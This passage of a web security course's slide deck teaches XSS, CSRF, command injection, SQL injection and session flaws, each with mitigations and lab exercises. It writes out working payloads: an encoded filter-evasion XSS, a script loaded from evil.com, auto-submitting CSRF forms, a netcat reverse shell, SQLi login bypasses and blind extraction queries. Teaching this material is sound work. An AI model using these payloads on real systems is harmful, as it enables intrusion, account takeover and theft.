+&#x26;&#x23;&#x78;&#x34;&#x36;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x66;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x35;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x36;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x66;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x64;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x39;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x65;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x37;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x38;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x33;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x33;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x66;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x65;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x33;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x39;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x34;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x35;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x33;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x34;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x38;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x31;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x34;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x31;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x63;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x63;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x66;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x37;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x33;&#x63;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x33;&#x3b;&#x26;&#x23;&#x78;&#x34;&#x33;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x34;&#x39;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x34;&#x3b;&#x26;&#x23;&#x78;&#x33;&#x65;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x35;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x34;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x34;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x66;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x65;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x37;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x34;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x31;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x63;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x63;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x66;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x37;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x33;&#x63;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x33;&#x3b;&#x26;&#x23;&#x78;&#x34;&#x33;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x34;&#x39;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x34;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x33;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x34;&#x33;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x65;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x65;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x65;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x39;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x37;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x31;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x39;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x66;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x36;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x31;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x35;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x37;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x35;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x38;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x36;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x39;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x63;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x34;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x35;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x66;&#x3b;&#x26;&#x23;&#x78;&#x33;&#x63;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x33;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x33;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x39;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x34;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x62;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x65;&#x3b;&#x26;&#x23;&#x78;&#x33;&#x65;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x64;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x62;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x33;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x33;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x66;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x39;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x33;&#x61;&#x3b;
+```html
+<SCRIPT a=">" SRC="httx://evil.com/a.js"></SCRIPT>
+```
+
+source: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+---
+# Exercise
+1. Start "Google Gruyere" - check readme.txt
+2. Find XSS!
+---
+class: center, middle
+# Question
+What does it mean for the attacker that the XSS payload is stored, potentially forever, on the website?
+---
+# Answer
+
+- the attack is launched against all visiting users, not just one
+- the attack is more easily detected by other users and administrators
+
+---
+class: center, middle
+# DOM-based XSS
+---
+# DOM-based XSS
+XSS payload is never sent to the server.
+
+Example:
+```
+http://example.com/search#<script>alert("xss");</script>
+```
+HTTP request:
+```http
+GET /search HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
+Connection: close
+```
+
+<img src="dom.png" width="100%" class="ns">
+---
+# DOM-based XSS example
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 1270
+Connection: close
+
+<html>
+  <script>
+
+    // Today, browsers include the pound sign in
+    // the hash and encode the entire thing
+	
+    var removePound = location.hash.substring(1);
+    var unescaped = unescape(removePound);
+
+    eval(unescaped);
+
+  </script>
+</html>
+```
+---
+# jQuery 1.8.3 bug
+```
+http://dumpco.re/lab/jqueryxss/#<img src=x onerror=alert('xss')>
+```
+
+```html
+<html>
+  <script src="jquery-1.8.3.min.js"></script>
+  <script>
+
+    // this used to work:
+    // $(location.hash);
+
+    // Today, browsers include the pound sign in the hash and encode the 
+    // entire thing,so the following is needed to demo the bug:
+
+    var removePound = location.hash.substring(1);
+    var unescaped = unescape(removePound);
+
+    $(unescaped);
+
+  </script>
+</html>
+```
+---
+class: middle, center
+# Worst case scenario: from XSS to RCE (remote code execution)
+---
+# From XSS to RCE
+If the victim user can upload files, then so can the attacker!
+
+Example XSS payload for Wordpress, with two steps:
+
+1. grab anti-CSRF nonce
+2. Use Wordpress functionality to upload a malicious PHP webshell
+
+full source: https://github.com/magnusstubman/presentations/blob/master/evil/wordpressxss2rce.js
+---
+# Demo
+<a href="xss2rce.mov">download xss2rce.mov</a>
+
+https://youtu.be/oifGQlO-PqI
+<iframe width="560" height="315" src="https://www.youtube.com/embed/oifGQlO-PqI" frameborder="0" allowfullscreen></iframe>
+---
+# If you could pick one...
+Which type of XSS would you pick if you wanted to steal an administrator's account? and why?
+
+- Reflected
+- Stored
+- DOM-based
+---
+class: middle, center
+# XSS mitigation
+---
+# XSS mitigation
+
+We want to turn:
+
+<img src="alertxss.png" width="70%">
+
+into:
+
+<img src="outputencoding.png" width="70%">
+
+---
+# XSS mitigation
+We achieve this by turning:
+```html
+<script>alert("xss");</script>
+```
+into:
+```html
+&amp;lt;script&amp;gt;alert(&amp;quot;xss&amp;quot;);&amp;lt;/script&amp;gt;
+```
+HTML entities: https://dev.w3.org/html5/html-author/charref
+---
+# XSS mitigation
+
+C#
+```c#
+HttpUtility.HtmlEncode() // NOT HttpUtility.HtmlAttributeEncode()
+```
+PHP
+```php
+echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+```
+JSP
+```jsp
+<p><c:out value="${bean.userControlledValue}"></p>
+<p><input name="foo" value="${fn:escapeXml(param.foo)}"></p>
+```
+Dangerous JavaScript functions:
+```javascript
+eval()
+document.write()
+document.writeln()
+element.innerHTML = "..."
+element.outerHTML = "..."
+```
+---
+# Built-in Browser XSS filters
+
+- Most browsers have them
+- Are enabled by default in most browsers
+- Are not perfect
+- Do **not** rely on them to prevent XSS for you as bypasses are found
+
+
+- `X-XSS-Protection: 0`
+	- Disables XSS filter
+- `X-XSS-Protection: 1`
+	- Enable it, instructs browser to  sanitize page.
+- `X-XSS-Protection: 1; mode=block`
+	- Enable it, prevent page rendering.
+- `X-XSS-Protection: 1; report=<reporting-uri>`
+	- Chromium only! Sanitize and report. This uses the functionality of the CSP report-uri directive to send a report.
+
+
+Use `1; mode=block` to disable sanitization.
+---
+class: middle, center
+# Exotic ideas
+---
+# Exotic ideas
+- spy on people through their webcam - https://developer.mozilla.org/en-US/docs/Web/API/WebRTC_API/Taking_still_photos
+- bitcoin mining - https://github.com/derjanb/hamiyoca
+- portscanning http://www.andlabs.org/tools/jsrecon.html 
+- BeeF - Browser exploitation framework - http://beefproject.com/
+---
+# Conclusion
+- We can steal sessions
+- We can do anything the victim can do - even get RCE
+- Always output encode - filters can (almost always) be bypassed
+- XSS may be more dangerous in the future as browsers become more powerful
+---
+class: middle, center
+# CSRF
+Cross-Site Request Forgery
+---
+# CSRF
+Goal: Performing action on behalf of a victim user
+---
+# Change password
+<img src="changepassword.png" width="100%">
+---
+# Add rogue account
+<img src="addhacker.png" width="65%">
+---
+class: middle
+```
+http://example.com/transferMoney.aspx?toAccount=7777&amp;amount=5000
+```
+---
+class: middle
+```html
+Hi Joe!
+
+I just came back from my vacation and thought that I'd share
+these beach photos with you ;)
+
+<a href="http://example.com/transferMoney.aspx?toAccount=7777&amp;amount=5000">
+	Click here
+</a>
+
+Regards,
+Rebecca <3
+```
+---
+class: middle
+```
+http://example.com/deleteAccount.php?areyousure=yes
+```
+---
+class: middle
+```html
+Hi Joe!
+
+I just came back from my vacation and thought that I'd share
+these beach photos with you ;)
+
+<a href="http://example.com/deleteAccount.php?areyousure=yes">Click here</a>
+
+Regards,
+Rebecca <3
+```
+---
+# POST requests
+```html
+<form action="/addUser.php" method="post">
+  username:<br>
+  <input type="text" name="username">
+  password:<br>
+  <input type="text" name="password">
+  <input type="submit" value="Add user">
+</form> 
+```
+<img src="adduser.png" width="40%">
+---
+# POST requests
+Automatic form post
+```html
+<form action="http://example.com/addUser.php" method="POST">
+  <input type="hidden" name="username" value="hacker" />
+  <input type="hidden" name="password" value="haxhaxhax" />
+  <input type="submit" value="Submit request" />
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+```
+---
+# POST requests
+Automatic AJAX POST request
+```html
+<script>
+	var xhr = new XMLHttpRequest();
+	xhr.open("POST", "http:\/\/example.com\/addUser.php", true);
+	xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
+	xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+	xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
+	xhr.withCredentials = true;
+
+	var body = "username=hacker&password=haxhaxhax";
+	var aBody = new Uint8Array(body.length);
+
+	for (var i = 0; i < aBody.length; i++) {
+	  aBody[i] = body.charCodeAt(i); 
+	}
+
+	xhr.send(new Blob([aBody]));
+</script>
+```
+---
+class: middle
+<img src="mallink.png" width="100%">
+---
+class: middle
+<img src="mallink2.png" width="100%">
+---
+class: middle
+<img src="csrfshort.png" width="100%">
+---
+class: middle
+```
+http://example.com/transferMoney.aspx?fromAccount=4444&amp;toAccount=7777&amp;amount=5000
+```
+<img src="downarrow.png" width="5%" style="box-shadow:none;">
+<!--<img src="downarrow.png" width="5%" style="box-shadow:none;display: block; margin-left: auto; margin-right: auto;">-->
+```
+http://goo.gl/ZnVP5n
+```
+```http
+HTTP/1.1 301 Moved Permanently
+Location: http://example.com/transferMoney.aspx?fromAccount=4444&toAccount=7777&amount=5000
+...
+```
+---
+# Exercise
+1. Start "Google Gruyere" - check readme.txt
+2. Find CSRF!
+---
+class: middle, center
+# CSRF mitigation
+---
+# CSRF mitigation
+
+1. Confirmation, or
+2. anti-CSRF tokens
+(or both)
+---
+# CSRF mitigation
+
+<img src="confirm.png" width="50%" class="c">
+---
+# CSRF mitigation
+
+```html
+<form>
+	<input type="hidden" name="antiCSRFToken" value="55hHf4ueowUIFHiEW2">
+	…
+</form>
+
+```
+
+anti-CSRF token can NOT be a cookie. Why?
+---
+# Conclusion
+
+- Functionality is vulnerable to CSRF if no confirmation or anti-CSRF tokens exist
+- Both GET and POST can be used
+- Anti-CSRF token must be something which is *not* automatically added by the browser in requests, and cannot be guessed by attackers
+- Attackers can bypass anti-CSRF token protection if an XSS exists
+---
+class: middle, center
+# Command injection
+---
+# Command injection
+Goal: Execute system commands on the server
+---
+# Command injection
+
+<img src="deletefile.png" width="40%">
+
+```html
+<p>Enter filename to delete</p>
+<form method="get">
+   <input type="text" name="filename">
+   <input type="submit">
+</form>
+<?php
+   if (isset( $_GET['filename'] ) ){
+       echo "Deleting file...";
+       system("rm '" . $_GET['filename'] . "'");
+   }
+?>
+```
+---
+<img src="phpsystem.png" width="100%">
+---
+# Command injection
+<img src="deletefile2censored.png" width="100%">
+```php
+system("rm '" . $_GET['filename'] . "'");
+```
+---
+# Command injection
+<img src="deletefile2.png" width="100%">
+
+Payload:
+```
+aa'; uname -a #
+```
+```php
+system("rm '" . $_GET['filename'] . "'");
+system("rm 'aa'; uname -a #'");
+```
+---
+# Command injection
+command separator: 
+```bash
+;
+```
+and:
+```bash
+&amp;&amp;
+```
+comment out the rest of the line: 
+```bash
+#
+```
+---
+# Exercise
+1. Start "Damn Vulnerable Web App (DVWA)" - check readme.txt
+2. Exploit the command injection vulnerability
+3. Get the contents of the `/etc/passwd` file
+4. Change DVWA security level from "low" to "medium" and attempt to exploit the vulnerability again
+4. Start a local netcat listener in a terminal and use the command injection to launch a reverse shell from the webserver
+	- Netcat listener: `nc -l -v -p 4444`
+	- Reverse shell: `nc -e /bin/bash 127.0.0.1 4444`
+5. Change DVWA security level from "medium" to "high" and attempt to exploit the vulnerability again
+---
+class: middle, center
+# Command injection mitigation
+---
+# Command injection mitigation
+
+1. Whitelist user input, or
+2. Input filtering
+---
+# Command injection mitigation
+```html
+<p>Enter filename to delete</p>
+<form method="get">
+   <input type="text" name="filename">
+   <input type="submit">
+</form>
+<?php
+	$input = $_GET['filename'];
+   if (isset( $input) ){
+
+	    echo "Deleting file...";
+		if ($input === "summer.jpg") {
+		   system("rm '" . $input . "'");
+		} elseif ($input === "autumn.jpg") {
+		   system("rm '" . $input . "'");
+		} elseif ($input === "winter.jpg") {
+		   system("rm '" . $input . "'");
+		} else {
+		   echo "Error! File not whitelisted!"
+		}
+   }
+?>
+```
+---
+# Command injection mitigation
+DVWA command injection level: impossible
+```php
+$target = $_REQUEST[ 'ip' ];
+$target = stripslashes( $target );
+
+$octet = explode( ".", $target );
+
+if( ( is_numeric( $octet[0] ) ) &&
+	( is_numeric( $octet[1] ) ) &&
+	( is_numeric( $octet[2] ) ) &&
+	( is_numeric( $octet[3] ) ) &&
+	( sizeof( $octet ) == 4 ) ) {
+
+	$target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
+
+	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+		$cmd = shell_exec( 'ping  ' . $target );
+	}
+	else {
+		$cmd = shell_exec( 'ping  -c 4 ' . $target );
+	}
+
+	echo "<pre>{$cmd}</pre>";
+} else {
+	echo '<pre>ERROR: You have entered an invalid IP.</pre>';
+}
+```
+---
+# Conclusion
+- Never trust unfiltered user input as part of a system command or `eval()` argument
+---
+class: middle, center
+# SQL injection (SQLi)
+---
+# SQLi
+Goal: Execute SQL queries against the web application's database
+---
+# SQLi
+Table:
+```
++-USERS----+----------+
+| username | password |
++---------------------+
+| admin    | pass123  |
+| kevin    | m0ney    |
+| john     | 619air   |
++----------+----------+
+```
+Query:
+```SQL
+SELECT * FROM users WHERE username='kevin' AND password='m0ney';
+```
+Result:
+```
++----------+----------+
+| kevin    | m0ney    |
++----------+----------+
+```
+---
+# SQLi
+```PHP
+$query = "SELECT * FROM users WHERE username='" . $_GET['username'] .
+         "' AND password='" . $_GET['password'] . "';";
+```
+If we set username to:
+```
+admin';--
+```
+
+Query becomes:
+```SQL
+SELECT * FROM users WHERE username='admin';--' AND password='';
+```
+Result:
+
+?
+---
+# SQLi
+```PHP
+$query = "SELECT * FROM users WHERE username='" . $_GET['username'] .
+         "' AND password='" . $_GET['password'] . "';";
+```
+If we set username to: 
+```
+admin';--
+```
+
+Query becomes:
+```SQL
+SELECT * FROM users WHERE username='admin';--' AND password='';
+```
+Result:
+```
++---------------------+
+| admin    | pass123  |
++---------------------+
+```
+---
+# SQLi
+```PHP
+$query = "SELECT * FROM users WHERE username='" . $_GET['username'] .
+         "' AND password='" . $_GET['password'] . "';";
+```
+If we set username to `admin` and password to:
+```
+' OR '1'='1
+```
+Query becomes:
+```SQL
+SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1';
+```
+Result:
+
+?
+---
+# SQLi
+```PHP
+$query = "SELECT * FROM users WHERE username='" . $_GET['username'] .
+         "' AND password='" . $_GET['password'] . "';";
+```
+If we set username to `admin` and password to:
+```
+' OR '1'='1
+```
+Query becomes:
+```SQL
+SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1';
+```
+Result:
+```
++---------------------+
+| admin    | pass123  |
+| kevin    | m0ney    |
+| john     | 619air   |
++----------+----------+
+```
+---
+# SQLi
+
+```SQL
+SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1';
+```
+<img src="downarrow.png" width="5%" style="box-shadow:none;display: block; margin-left: auto; margin-right: auto;">
+```SQL
+SELECT * FROM users WHERE (username='admin' AND password='') OR ('1'='1');
+                                             ^                     ^
+                                             |                     |
+                         is evaluated first, returns nothing       |
+                                                                   |
+                              is evaluated secondly, returns all items in table
+```
+full list of operator precedence: https://dev.mysql.com/doc/refman/5.7/en/operator-precedence.html
+---
+# Blind SQLi
+A SQLi is said to be "blind" if the attacker get no feedback regardless wether the query was successfull or caused an exception.
+---
+# Blind SQLi
+A SQLi is said to be "blind" if the attacker get no feedback regardless wether the query was successfull or caused an exception.
+
+Exploitation: make the request take more time if it was successful. (this is known as a side channel)
+---
+# Blind SQLi
+```sql
+# MySQL
+SELECT * FROM products WHERE id=1-SLEEP(15)
+SELECT * FROM products WHERE id=1-BENCHMARK(100000000, rand())
+
+# SQLServer
+SELECT * FROM products WHERE id=1; WAIT FOR DELAY '00:00:15'
+SELECT * FROM products WHERE id=1; IF SYSTEM_USER='sa' WAIT FOR DELAY '00:00:15'
+
+# Oracle
+BEGIN DBMS_LOCK.SLEEP(15); END;
+```
+---
+# Blind SQLi
+```sql
+SELECT
+	IF(SUBSTRING(user_password,1,1) = CHAR(65),SLEEP(2),null)
+FROM
+	users WHERE user_id = 1;
+```
+`char(65)` is "A"
+(http://www.asciitable.com/)
+---
+# Exercise
+1. start Damn Vulnerable Web App (DVWA) - check readme.txt
+2. Exploit the SQLi
+3. Use `sqlmap` to exploit the SQLi (run `sqlmap -hh` for help)
+5. Proxy `sqlmap` through burp so that you can see what's going on. Look at `sqlmap`'s traffic. (`--proxy=http://127.0.0.1:8080`)
+7. Dump entire database using `sqlmap` (without proxying through burp)
+0. Get remote code execution using `sqlmap` (without proxying through burp)
+11. Get remote code execution again using `sqlmap`, this time while proxying through burp. How does `sqlmap` get code execution?
+
+note: `sqlmap` caches previous responses locally. Run `sqlmap --purge-output`.
+If things get wrid, and make sure that your session is still valid
+
+---
+class: middle, center
+# SQLi mitigation
+---
+# SQLi mitigation
+
+```SQL
+                                      +---- data ---------+
+                                      |                   |
+                                      v                   v
+SELECT * FROM users WHERE username='kevin' AND password='m0ney';
+  ^    ^  ^     ^     ^       ^             ^     ^
+  |    |  |     |     |       |             |     |
+  +-------------------- query --------------------+
+```
+
+Solution: separate query and data
+---
+# SQLi mitigation
+
+```php
+$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
+$stmt->bind_param("ss", $username, $password);
+```
+
+```SQL
+admin';--
+```
+becomes
+```SQL
+admin'';--
+```
+' is the escape character
+---
+# SQLi mitigation
+```c#
+private static void UpdateDemographics(Int32 customerID,
+    string demoXml, string connectionString)
+{
+    string commandText = "UPDATE Sales.Store SET Demographics = @demographics "
+        + "WHERE CustomerID = @ID;";
+
+    using (SqlConnection connection = new SqlConnection(connectionString))
+    {
+        SqlCommand command = new SqlCommand(commandText, connection);
+        command.Parameters.Add("@ID", SqlDbType.Int);
+        command.Parameters["@ID"].Value = customerID;
+
+        command.Parameters.AddWithValue("@demographics", demoXml);
+
+        try
+        {
+            connection.Open();
+            Int32 rowsAffected = command.ExecuteNonQuery();
+            Console.WriteLine("RowsAffected: {0}", rowsAffected);
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine(ex.Message);
+        }
+    }
+}
+```
+---
+### Mandatory xkcd reference #1 (https://xkcd.com/327/)
+
+<img src="exploits_of_a_mom.png" width="100%">
+---
+# Conclusion
+- Never concatenate data and query
+- Use prepared statements
+---
+class: middle, center
+# Session Management
+---
+class: middle, center
+*"No need to test session management because we have BankID"*
+---
+class: middle, center
+*"No need to test session management because we have BankID"*
+## Strong authentication does ***not*** automatically give you strong session management!
+---
+# Session Management
+- Guessable session token
+- Concurrent sessions
+- Session administration
+- Session token exposure
+- No server-side termination of session upon logout
+- Session fixation
+- Session ID reuse
+- Sessions don't expire
+---
+# Guessable session token
+DVWA weak session id security level: low
+```php
+if (!isset ($_SESSION['last_session_id'])) {
+	$_SESSION['last_session_id'] = 0;
+}
+
+$_SESSION['last_session_id']++;
+
+$cookie_value = $_SESSION['last_session_id'];
+setcookie("dvwaSession", $cookie_value);
+```
+---
+# Guessable session token
+DVWA weak session id security level: medium
+```php
+$cookie_value = time();
+setcookie("dvwaSession", $cookie_value);
+```
+---
+# Guessable session token
+DVWA weak session id security level: high
+```php
+if (!isset ($_SESSION['last_session_id_high'])) {
+	$_SESSION['last_session_id_high'] = 0;
+}
+
+$_SESSION['last_session_id_high']++;
+$cookie_value = md5($_SESSION['last_session_id_high']);
+setcookie("dvwaSession",
+	$cookie_value,
+	time()+3600,
+	"/vulnerabilities/weak_id/",
+	$_SERVER['HTTP_HOST'],
+	false,
+	false);
+```
+---
+class: middle
+
+[http://php.net/manual/en/function.setcookie.php](http://php.net/manual/en/function.setcookie.php)
+```php
+bool setcookie (
+	string $name [,
+	string $value = "" [,
+	int $expire = 0 [,
+	string $path = "" [,
+	string $domain = "" [,
+	bool $secure = false [,
+	bool $httponly = false ]]]]]]
+);
+```
+---
+# Guessable session token
+DVWA weak session id security level: impossible
+```php
+$cookie_value = sha1(mt_rand() . time() . "Impossible");
+
+setcookie("dvwaSession",
+	$cookie_value, time()+3600,
+	"/vulnerabilities/weak_id/",
+	$_SERVER['HTTP_HOST'],
+	true,
+	true); 
+```
+---
+# Concurrent sessions
+Question: Should it be possible to have more than one session at once?
+---
+# Concurrent sessions
+Question: Should it be possible to have more than one session at once?
+
+- Social media: probably okey
+- Internet banking: probably not
+---
+# Concurrent sessions
+Potential IOCs (Indicator Of Compromise):
+
+- New session is opened while current session is active
+- Requests with valid session token starts appearing from a different IP-address than the one which logged in
+	- could be attack
+	- could be that user switched from Ethernet to Wi-Fi or started using mobile hotspot
+---
+# Concurrent sessions
+Potential IOCs (Indicator Of Compromise):
+
+- New session is opened while current session is active
+- Requests with valid session token starts appearing from a different IP-address than the one which logged in
+	- could be attack
+	- could be that user switched from Ethernet to Wi-Fi or started using mobile hotspot
+
+
+Solution: Alert the "first" user via trusted channel (e.g. e-mail/sms) that something happened and let him/her decide what to do
+---
+# Session administration
+<img class="c" src="active-sessions.png" width="35%">
+
+source: https://telegram.org/blog/sessions-and-2-step-verification
+---
+class: middle, center
+## Question: Should we terminate all sessions upon password change?
+---
+class: middle, center
+## Question: Should we terminate all sessions upon password change?
+Answer: depends on why the user changed his/her password
+---
+# Session token exposure
+Exposure of session tokens potentially makes users vulnerable to session re-use. Session token in URL means that the session token is saved in:
+ - Browser history
+ - Proxy cache
+ - Load balancer cache
+ - Web server access log
+ - HTTP referer header e.g. session token is readable by externally linked sites
+
+```http
+GET /somePage.aspx HTTP/1.1
+Host: external-page.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
+Referer: http://example.com/something.aspx?SessionID=573deb8b889a38b32dbe535e3dc0affb
+Connection: close
+```
+- **Never** store session token in URL or any other location which is cached stored
+- Keep secrets in Cookies or custom HTTP headers which are not leaked to third parties
+---
+## No server-side termination of session upon logout
+Attack scenario:
+1. Victim logs in, receives new SessionID
+2. Victim logs out
+3. Attacker gets read access to the SessionID somehow
+4. Attacker now has access to the victims account because the SessionID was never terminated server-side
+
+Conclusion:
+- Always terminate sessions server-side
+- Clients should repeat the logout request until server confirms that session has been terminated
+---
+# Session fixation
+Spot the problem(s).
+```http
+POST /login.php HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 105
+Cookie: SessionID=573deb8b889a38b32dbe535e3dc0affb
+Connection: close
+
+username=kevin&password=m0ney
+```
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 1270
+Connection: close
+
+<!doctype html>
+<html>
+...
+Authentication succeeded. Welcome, Kevin!
+```
+---
+# Session fixation
+Spot the problem(s).
+```http
+POST /login.php HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 105
+Cookie: SessionID=573deb8b889a38b32dbe535e3dc0affb
+Connection: close
+
+username=kevin&password=m0ney
+```
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 1270
+Set-Cookie: SessionID=573deb8b889a38b32dbe535e3dc0affb; path=/
+Connection: close
+
+<!doctype html>
+<html>
+...
+Authentication succeeded. Welcome, Kevin!
+```
+---
+# Session fixation
+Attack scenario:
+1. Victim logs in, received new SessionID
+2. Victim logs out, terminating the session
+3. Attacker gets read access to the SessionID somehow. This should **not** be a problem since the session is terminated server-side (or should be, anyway)
+4. Victim logs in using the same browser as before, which still has the SessionID cookie from the last session (should not be a problem)
